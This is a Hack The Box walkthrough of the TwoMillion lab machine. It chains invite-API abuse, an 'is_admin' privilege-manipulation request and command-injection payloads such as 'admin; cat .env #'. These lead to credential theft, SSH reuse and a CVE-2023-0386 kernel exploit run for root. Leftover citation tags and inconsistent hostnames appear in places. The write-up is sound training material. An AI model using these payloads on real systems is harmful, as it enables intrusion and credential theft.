# Hack The Box - TwoMillion Walkthrough

**Machine Author(s):** Not specified in the supplied notes  
**Difficulty:** Not specified in the supplied notes  
**Classification:** Walkthrough / Notes  

## Synopsis

TwoMillion is an HTB Linux machine centered around web/API enumeration, privilege manipulation, OS command injection, credential disclosure, SSH access, and local privilege escalation. The walkthrough begins with hostname resolution and reconnaissance, moves through invite-code generation and authenticated API testing, then demonstrates command execution through the VPN generation endpoint. Disclosed application credentials are reused for SSH access, where local mail provides a clue toward the OverlayFS/FUSE vulnerability **CVE-2023-0386**, ultimately leading to root access in the authorized HTB lab. fileciteturn1file0L3-L8

---

## Phase 1: Initial Setup & DNS Resolution

**Concept:** Making sure the HTB target hostname resolves correctly before beginning enumeration.

**Problem:**

```text
ping: twomillion.htb: Name or service not known
```

The local system could not resolve the target hostname.

**Command:**

```bash
sudo nano /etc/hosts
```

Add:

```text
[TARGET_IP]  2million.htb
```

The supplied notes record the lab IP as:

```text
10.129.142.8
```

Then test:

```bash
ping 2million.htb
```

**How it works in practice:** When an HTB target redirects to a hostname, that hostname needs to resolve locally. Adding the target mapping to `/etc/hosts` allows tools and the browser to reach `2million.htb`. fileciteturn1file0L22-L50

---

## Phase 2: Reconnaissance & Scanning

**Concept:** Scanning the target host to discover open ports and active services.

**Full TCP Port Scan:**

```bash
nmap -p- twomillion.htb --min-rate 10000
```

**Discovered Services:**

* **Port 22 (SSH):** OpenSSH 8.9p1 Ubuntu 3ubuntu0.1.
* **Port 80 (HTTP):** nginx web server.

**Service Enumeration:**

```bash
nmap -p 22,80 -sC -sV -oN nmapscan twomillion.htb
```

**How it works in practice:** The full TCP scan identifies available entry points. The second scan performs default script scanning and service/version detection while saving the results to `nmapscan`.

**Useful flags:**

```text
-p-  → Scan all TCP ports
-sC  → Run default Nmap scripts
-sV  → Detect service/version information
-oN  → Save normal-format output
```

The HTTP service redirected to:

```text
http://2million.htb/
```

and Nmap reported:

```text
http-title: Did not follow redirect to http://2million.htb/
```

---

## Phase 3: Virtual Host Enumeration

**Concept:** Fuzzing the HTTP `Host` header to identify virtual hosts or subdomains.

**Command:**

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://2million.htb -H "Host: FUZZ.2million.htb" -fs 162
```

**How it works in practice:** `ffuf` replaces `FUZZ` with entries from the wordlist and sends requests with different `Host:` values. Response-size filtering removes responses matching the baseline size.

**Important options:**

* **`-w`:** Wordlist.
* **`-u`:** Target URL.
* **`-H`:** Custom HTTP header.
* **`FUZZ`:** Fuzzing placeholder.
* **`-fs 162`:** Filter responses with size 162.

---

## Phase 4: Web Application Reconnaissance

**Concept:** Inspecting client-side JavaScript to discover undocumented API functionality.

A JavaScript file was discovered:

```html
<script defer src="/js/inviteapi.min.js"></script>
```

The file was saved and inspected:

```bash
nano inviteapi.js
cat inviteapi.js
```

The minified JavaScript was beautified/deobfuscated.

**Important functions discovered:**

```text
verifyInviteCode(code)
```

makes a request to:

```http
POST /api/v1/invite/verify
```

and:

```text
makeInviteCode()
```

makes a request to:

```http
POST /api/v1/invite/how/to/generate
```

**How it works in practice:** Client-side JavaScript can reveal API endpoints, parameter names, request formats, authentication behavior, and functionality that may not be obvious from the visible web interface. fileciteturn1file0L144-L198

---

## Phase 5: Invite-Code Generation

**Concept:** Following the API's instructions and decoding the returned data.

**Command:**

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

The response indicated that the data used **ROT13**.

**Encoded message:**

```text
Va beqre gb traengr gur vaivgr pbqr, znxr n CBFG erqhrfg gb /ncv/v1/vaivgr/traengr
```

**Decoded message:**

```text
In order to genrate the invite code, make a POST reduest to /api/v1/invite/generate
```

The important endpoint is:

```http
POST /api/v1/invite/generate
```

The generation endpoint then returned a Base64-style value:

```text
UlcySlYtSlRZNIatRFc0MzUtRVpRMk0=
```

**Command:**

```bash
echo 'UlcySlYtSlRZNIatRFc0MzUtRVpRMk0=' | base64 -d
```

**Decoded invite code:**

```text
RW2JV-JTY6P-DW435-EZQ2M
```

The invite code was used to register an account and access the dashboard.

**How it works in practice:** The box demonstrates two common data transformations: ROT13 and Base64. These are encoding/transformation mechanisms rather than encryption that requires a secret key. fileciteturn1file0L202-L277

---

## Phase 6: Authenticated Application Access

**Concept:** Using the generated invite code to obtain authenticated application access.

After registration, the dashboard became accessible.

The application showed the authenticated user as:

```text
admin
```

The dashboard also displayed a database-migration announcement.

---

## Phase 7: API Privilege Manipulation

**Concept:** Testing whether an authenticated API endpoint improperly trusts a client-controlled privilege parameter.

Burp Suite Repeater was used to test:

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Content-Type: application/json
```

**JSON body:**

```json
{
    "email": "admin@2million.htb",
    "is_admin": 1
}
```

**Successful response:**

```http
HTTP/1.1 200 OK
```

```json
{
    "id": 13,
    "username": "admin",
    "is_admin": 1
}
```

**How it works in practice:** The API accepted the `is_admin` parameter and updated the account's privilege state. This is an authorization-control issue because a privilege-related value was accepted from the request body. fileciteturn1file0L295-L334

---

## Phase 8: Verifying Administrative Access

**Concept:** Confirming that the privilege change is actually recognized by the application.

**Request:**

```http
GET /api/v1/admin/auth HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=<valid-session>
```

**Response:**

```http
HTTP/1.1 200 OK
```

```json
{
    "message": true
}
```

**How it works in practice:** A separate authorization endpoint confirms whether the current session is recognized as having administrative access instead of relying only on the previous update response. fileciteturn1file0L338-L364

---

## Phase 9: Understanding HTTP 401

**Concept:** Diagnosing authentication/session problems when an API request is rejected.

A request returned:

```http
HTTP/1.1 401 Unauthorized
```

A `401` indicates that the server did not accept the authentication/session information required for that endpoint.

**Things to check:**

1. Is the session still valid?
2. Is the correct `PHPSESSID` being sent?
3. Did the request originate from the correct authenticated session?
4. Does the endpoint require a particular privilege?
5. Does the request match the original browser request?

**Status-code reminder:**

| Code | Meaning |
|---|---|
| `200` | Success |
| `201` | Created |
| `204` | Success, no content |
| `400` | Bad request |
| `401` | Authentication required/failed |
| `403` | Authenticated but forbidden |
| `404` | Not found |
| `405` | Method not allowed |
| `500` | Server-side error |

---

## Phase 10: OS Command Injection

**Concept:** Testing whether user-controlled input reaches a command interpreter.

The VPN generation endpoint was:

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Content-Type: application/json
```

**Payload:**

```json
{
    "username": "admin; id #"
}
```

**Result:**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command executed in the context of:

```text
www-data
```

**How it works in practice:** The supplied input contains shell syntax. The semicolon can separate commands, while `#` can begin a shell comment. Conceptually:

```text
original-command admin; id #
```

can become:

```text
original-command admin
id
```

The exact behavior depends on how the application constructs and executes the command.

This demonstrates **OS command injection**, where untrusted input reaches a command interpreter without adequate sanitization or parameterization. fileciteturn1file0L408-L475

---

## Phase 11: Command Injection Verification & Enumeration

**Concept:** Confirming command execution and using it to inspect the application environment.

**List application files:**

```json
{
    "username": "admin; ls #"
}
```

The endpoint returned files/directories including:

```text
Database.php
Router.php
VPN
assets
controllers
css
fonts
images
index.php
js
views
```

**Detailed listing:**

```json
{
    "username": "admin; ls -la #"
}
```

This exposed:

```text
.env
Database.php
Router.php
VPN/
assets/
controllers/
css/
fonts/
images/
index.php
js/
```

**How it works in practice:** After confirming command execution, directory enumeration reveals the application's structure and highlights configuration files such as `.env`, which commonly contain application secrets. fileciteturn1file0L479-L547

---

## Phase 12: `.env` Disclosure

**Concept:** Identifying sensitive configuration data exposed through command execution.

**Payload:**

```json
{
    "username": "admin; cat .env #"
}
```

The output contained:

```text
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

**How it works in practice:** Application configuration files can expose database hosts, database names, usernames, passwords, API keys, and other secrets. In a real environment, credentials disclosed this way should be considered compromised. fileciteturn1file0L551-L582

---

## Phase 13: Initial Access via SSH

**Concept:** Testing whether discovered application credentials are reused on another authorized service.

**Command:**

```bash
ssh admin@2million.htb
```

The login succeeded.

**System information:**

```text
OS: Ubuntu 22.04.2 LTS
Kernel: Linux 5.15.70-051570-generic x86_64
User: admin
```

The shell also displayed:

```text
You have mail.
```

**How it works in practice:** Credentials recovered from the application's configuration were tested against the exposed SSH service, resulting in an authenticated shell as `admin`. fileciteturn1file0L586-L621

---

## Phase 14: Local Enumeration & System Mail

**Concept:** Searching local system information for privilege-escalation clues.

Inspect the user's mail:

```bash
cd /var/mail
cat admin
```

The message metadata included:

```text
From: ch4p@2million.htb
To: admin@2million.htb
Subject: Urgent: Patch System OS
```

The message referenced:

```text
OverlayFS / FUSE
```

This provided a clue for investigating a Linux kernel privilege-escalation vulnerability.

---

## Phase 15: Kernel / LPE Investigation

**Concept:** Connecting local system information and application clues to a known kernel vulnerability.

**System information:**

```text
Ubuntu 22.04.2 LTS
Linux 5.15.70-051570-generic
```

The OverlayFS/FUSE clue led to investigation of:

```text
CVE-2023-0386
```

**High-level concept:**

The vulnerability involves Linux `OverlayFS` and interaction with FUSE-backed filesystems. The relevant security issue involves filesystem metadata handling and can result in a setuid file retaining elevated properties under affected conditions.

**Study chain:**

```text
Unprivileged user
       ↓
FUSE filesystem
       ↓
OverlayFS
       ↓
Incorrect metadata handling
       ↓
SetUID file
       ↓
Privilege escalation
```

fileciteturn1file0L661-L700

---

## Phase 16: Privilege Escalation to Root

**Concept:** Compiling and executing the CVE-2023-0386 proof of concept in the authorized HTB environment.

The exploit source was saved as:

```text
poc.c
```

**Compile:**

```bash
gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl
```

**Execute:**

```bash
chmod +x poc
./poc
```

The exploit created and used an OverlayFS/FUSE setup under `/tmp`.

**Observed result:**

```text
root@2million:/tmp#
```

**How it works in practice:** The local kernel vulnerability provides the final privilege-escalation step, moving from the `admin` shell to a root shell in the HTB lab. fileciteturn1file0L705-L730

---

## Final Attack Chain

```text
1. Add target to /etc/hosts
          ↓
2. Nmap
          ↓
3. Find SSH + HTTP
          ↓
4. Follow HTTP redirect to 2million.htb
          ↓
5. Fuzz virtual hosts
          ↓
6. Inspect inviteapi.min.js
          ↓
7. Discover invite API
          ↓
8. Request invite-generation instructions
          ↓
9. Decode ROT13
          ↓
10. POST to invite generation endpoint
          ↓
11. Decode Base64 invite code
          ↓
12. Register account
          ↓
13. Inspect API with Burp
          ↓
14. Modify is_admin parameter
          ↓
15. Verify admin access
          ↓
16. Test VPN generation endpoint
          ↓
17. Identify command injection
          ↓
18. Execute id / ls / cat
          ↓
19. Read .env
          ↓
20. Discover credentials
          ↓
21. SSH as admin
          ↓
22. Inspect local mail
          ↓
23. Identify OverlayFS/FUSE clue
          ↓
24. Research CVE-2023-0386
          ↓
25. Compile/run PoC
          ↓
26. Root shell
```

---

## Key Lessons

* **DNS / Hosts:** `/etc/hosts` can map HTB hostnames to target IPs.
* **Reconnaissance:** Identify ports, services, versions, and redirects before exploitation.
* **JavaScript Enumeration:** Client-side code can reveal undocumented API routes and request formats.
* **API Testing:** Examine parameters and authorization controls rather than trusting the frontend.
* **Authentication vs Authorization:** Authentication establishes identity; authorization determines what that identity can access.
* **Command Injection:** User input reaching a shell can result in arbitrary command execution.
* **Configuration Disclosure:** `.env` files can expose credentials and application secrets.
* **Credential Reuse:** Credentials found in one application may work against another exposed service.
* **Local Enumeration:** Mail, kernel information, and configuration can provide privilege-escalation clues.
* **Kernel LPE:** System version and vulnerability clues can lead to a suitable local privilege-escalation investigation.
